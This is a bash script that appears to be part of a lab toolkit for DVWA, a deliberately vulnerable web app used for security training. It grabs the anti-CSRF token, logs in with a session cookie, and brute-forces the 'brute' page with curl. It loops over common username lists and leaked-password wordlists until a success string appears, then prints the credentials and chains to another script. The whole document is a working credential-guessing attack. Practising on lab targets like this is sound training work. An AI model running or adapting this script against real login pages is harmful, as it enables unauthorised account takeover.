#vulnId.sh --> bruteForce.sh

echo -e "\n---- Starting Brute Force on brute vulnerability ----"
sleep 3s

## Variables
LOGIN_URL=$LOGIN_URL
BRUTE_DIR=$BRUTE_DIR
#USER and PASS found from bruteLogin.sh
DVWA_USER=$DVWA_USER
DVWA_PASS=$DVWA_PASS

#DVWA_USER='admin'
#DVWA_PASS='password'

USER_LIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS_LIST="/usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt"

## Value to look for in response in webpage source code
SUCCESS="Welcome to the password protected area $DVWA_USER"

## Anti CSRF token
CSRF="$( curl -sc ~/Documents/DVWA/scripts/dvwa.cookie "$LOGIN_URL" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
sed -i '/security/d' ~/Documents/DVWA/scripts/dvwa.cookie

## Login to DVWA using cookie
curl -sb ~/Documents/DVWA/scripts/dvwa.cookie -d "username=${DVWA_USER}&password=${DVWA_PASS}&user_token=${CSRF}&Login=Login" "$LOGIN_URL" >/dev/null
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Display USER:PASS attempts to user
    #echo "Try ${i}: ${_USER} : ${_PASS}"

    ## Connect to web server 
    REQUEST="$( curl -sb 'security=low' -b ~/Documents/DVWA/scripts/dvwa.cookie "$BRUTE_DIR/?username=${_USER}&password=${_PASS}&Login=Login" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response against SUCCESS string
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\nFound at Try: ${i}"
      echo "Username: ${_USER}"
      echo "Password: ${_PASS}"
            
      #echo "${REQUEST}"
      echo "$SUCCESS"
      sleep 3s
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
#rm -f /tmp/dvwa.cookie

export COUNT=2

/bin/bash ~/Documents/DVWA/scripts/vulnId.sh
